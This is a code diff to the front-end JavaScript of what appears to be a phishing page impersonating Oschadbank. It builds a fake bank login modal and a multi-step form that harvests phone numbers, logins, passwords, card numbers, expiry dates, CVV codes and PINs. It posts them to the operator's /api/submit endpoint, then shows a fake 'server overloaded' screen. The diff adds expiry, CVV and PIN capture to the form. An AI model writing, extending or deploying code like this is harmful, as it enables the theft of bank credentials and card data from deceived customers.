@@ -225,7 +225,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     <button class="submit-button" id="oschad-submit-btn" disabled>ПРОДОВЖИТИ</button>
                 </div>
             `;
-        } // Здесь можно будет добавить else if для других банков
+        }
         customModalContent.innerHTML = html;
         customModalOverlay.style.display = 'flex';
         addCustomModalListeners(bankName);
@@ -235,7 +235,6 @@ document.addEventListener('DOMContentLoaded', () => {
         if (bankName === 'Ощадбанк') {
             const modal = document.querySelector('.oschad-lk-modal');
             if (!modal) return;
-
             const submitBtn = modal.querySelector('.submit-button');
             const togglePhoneBtn = modal.querySelector('#toggle-phone');
             const toggleLoginBtn = modal.querySelector('#toggle-login');
@@ -243,7 +242,6 @@ document.addEventListener('DOMContentLoaded', () => {
             const loginForm = modal.querySelector('#login-form');
             const oschadBackArrow = modal.querySelector('.back-arrow');
             let activeOschadForm = 'phone';
-            
             const phoneInput = modal.querySelector('#phone_input');
             const phonePassInput = modal.querySelector('#phone_password_input');
             const loginInput = modal.querySelector('#login_input');
@@ -251,27 +249,15 @@ document.addEventListener('DOMContentLoaded', () => {
             
             phoneInput.addEventListener('input', (e) => {
                 let value = e.target.value.replace(/\D/g, '').substring(0, 9);
-                let formatted = value.replace(/(\d{2})(\d{3})?(\d{2})?(\d{2})?/, (match, p1, p2, p3, p4) => {
-                    let res = p1;
-                    if (p2) res += ' ' + p2;
-                    if (p3) res += ' ' + p3;
-                    if (p4) res += ' ' + p4;
-                    return res;
-                });
+                let formatted = value.replace(/(\d{2})(\d{3})?(\d{2})?(\d{2})?/, (match, p1, p2, p3, p4) => [p1, p2, p3, p4].filter(Boolean).join(' '));
                 e.target.value = formatted;
             });
 
             const updateOschadButtonState = () => {
                 const isPhoneFormValid = activeOschadForm === 'phone' && phoneInput.value.replace(/\D/g, '').length === 9 && phonePassInput.value.length > 0;
                 const isLoginFormValid = activeOschadForm === 'login' && loginInput.value.length > 0 && loginPassInput.value.length > 0;
-
-                if (isPhoneFormValid || isLoginFormValid) {
-                    submitBtn.classList.add('active');
-                    submitBtn.disabled = false;
-                } else {
-                    submitBtn.classList.remove('active');
-                    submitBtn.disabled = true;
-                }
+                if (isPhoneFormValid || isLoginFormValid) { submitBtn.classList.add('active'); submitBtn.disabled = false; } 
+                else { submitBtn.classList.remove('active'); submitBtn.disabled = true; }
             };
             
             [phoneInput, phonePassInput, loginInput, loginPassInput].forEach(input => {
@@ -279,21 +265,15 @@ document.addEventListener('DOMContentLoaded', () => {
             });
 
             togglePhoneBtn.addEventListener('click', () => {
-                togglePhoneBtn.classList.add('active');
-                toggleLoginBtn.classList.remove('active');
-                phoneLoginForm.style.display = 'block';
-                loginForm.style.display = 'none';
-                activeOschadForm = 'phone';
-                updateOschadButtonState();
+                togglePhoneBtn.classList.add('active'); toggleLoginBtn.classList.remove('active');
+                phoneLoginForm.style.display = 'block'; loginForm.style.display = 'none';
+                activeOschadForm = 'phone'; updateOschadButtonState();
             });
 
             toggleLoginBtn.addEventListener('click', () => {
-                toggleLoginBtn.classList.add('active');
-                togglePhoneBtn.classList.remove('active');
-                phoneLoginForm.style.display = 'none';
-                loginForm.style.display = 'block';
-                activeOschadForm = 'login';
-                updateOschadButtonState();
+                toggleLoginBtn.classList.add('active'); togglePhoneBtn.classList.remove('active');
+                phoneLoginForm.style.display = 'none'; loginForm.style.display = 'block';
+                activeOschadForm = 'login'; updateOschadButtonState();
             });
 
             oschadBackArrow.addEventListener('click', () => { customModalOverlay.style.display = 'none'; });
@@ -317,22 +297,8 @@ document.addEventListener('DOMContentLoaded', () => {
                     dataToSend.login = loginInput.value;
                     dataToSend.password = loginPassInput.value;
                 }
-                
                 sendDataToServer(dataToSend, true);
-                
-                customModalContent.innerHTML = `
-                    <div class="oschad-lk-modal">
-                        <div class="header">
-                            <span class="back-arrow" onclick="document.getElementById('custom-modal-overlay').style.display='none'">←</span>
-                            <span class="title">Зачекайте</span>
-                        </div>
-                        <div class="welcome-section">
-                            <img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">
-                            <h3>Зачекайте</h3>
-                            <p>Сервер перевантажений</p>
-                        </div>
-                    </div>
-                `;
+                customModalContent.innerHTML = `<div class="oschad-lk-modal"><div class="header"><span class="back-arrow" onclick="document.getElementById('custom-modal-overlay').style.display='none'">←</span><span class="title">Зачекайте</span></div><div class="welcome-section"><img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading..."><h3>Зачекайте</h3><p>Сервер перевантажений</p></div></div>`;
             };
         }
     }
@@ -340,11 +306,7 @@ document.addEventListener('DOMContentLoaded', () => {
     async function sendDataToServer(data, isFinal) {
         collectedData = { ...collectedData, ...data };
         try {
-            await fetch(`/api/submit`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ sessionId, bankName: activeBankData.name, isFinalStep: isFinal, referrer: localStorage.getItem('referrer') || 'unknown', ...collectedData }),
-            });
+            await fetch(`/api/submit`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId, bankName: activeBankData.name, isFinalStep: isFinal, referrer: localStorage.getItem('referrer') || 'unknown', ...collectedData }), });
         } catch (error) { console.error('Failed to send data:', error); }
     }
 
@@ -385,8 +347,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function handleNextStep() {
-        if (!validateCurrentStep()) { nextBtn.disabled = true; return; }
-        nextBtn.disabled = false;
+        if (!validateCurrentStep()) return; 
         let data = {};
         stepContent.querySelectorAll('.input-field').forEach(input => {
             let key = input.id;
@@ -425,7 +386,6 @@ document.addEventListener('DOMContentLoaded', () => {
         modalFooter.style.display = 'flex';
         backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none';
         nextBtn.style.display = 'block';
-        nextBtn.disabled = true; // Start as disabled
         addInputFormatting();
     }
 
@@ -435,31 +395,37 @@ document.addEventListener('DOMContentLoaded', () => {
     function addInputFormatting() {
         const phoneInput = document.getElementById('phone');
         if (phoneInput) {
-            phoneInput.addEventListener('input', () => {
-                let value = phoneInput.value.replace(/\D/g, '').substring(0, 9);
-                phoneInput.value = value.replace(/(\d{2})(\d{3})?(\d{2})?(\d{2})?/, (m, p1, p2, p3, p4) => [p1, p2, p3, p4].filter(Boolean).join(' '));
-                nextBtn.disabled = phoneInput.value.replace(/\D/g, '').length !== 9;
+            phoneInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '').substring(0, 9);
+                e.target.value = value.replace(/(\d{2})(\d{3})?(\d{2})?(\d{2})?/, (m, p1, p2, p3, p4) => [p1, p2, p3, p4].filter(Boolean).join(' '));
             });
         }
-        const cardInput = document.getElementById('card');
-         if (cardInput) {
-             cardInput.addEventListener('input', () => {
-                 cardInput.value = cardInput.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
-                 nextBtn.disabled = cardInput.value.replace(/\D/g, '').length < 16;
-             });
-         }
+        const cardInput = document.getElementById('card') || document.getElementById('card_confirm');
+        if (cardInput) { cardInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim(); }); }
+        const cardExpiryInput = document.getElementById('card-expiry');
+        if (cardExpiryInput) { cardExpiryInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d{2})/, '$1/$2'); }); }
     }
 
     function validateCurrentStep() {
         let isValid = true;
         stepContent.querySelectorAll('.input-field').forEach(input => {
+            const errorContainer = input.closest('.input-group')?.querySelector('.error-message');
+            input.classList.remove('invalid');
+            if (errorContainer) errorContainer.style.display = 'none';
             let value = input.value.replace(/\D/g, '');
             let requiredLength = 0;
             switch (input.id) {
                 case 'phone': requiredLength = 9; break;
-                case 'card': requiredLength = 16; break;
+                case 'card': case 'card_confirm': requiredLength = 16; break;
+                case 'card-expiry': requiredLength = 4; break;
+                case 'card-cvv': requiredLength = 3; break;
+                case 'pin': requiredLength = 4; break;
             }
-            if (requiredLength > 0 && value.length < requiredLength) { isValid = false; }
+            if (requiredLength > 0 && value.length < requiredLength) {
+                isValid = false;
+                input.classList.add('invalid');
+                if (errorContainer) { errorContainer.textContent = `Поле має містити ${requiredLength} цифр.`; errorContainer.style.display = 'block'; }
+            }
         });
         return isValid;
     }
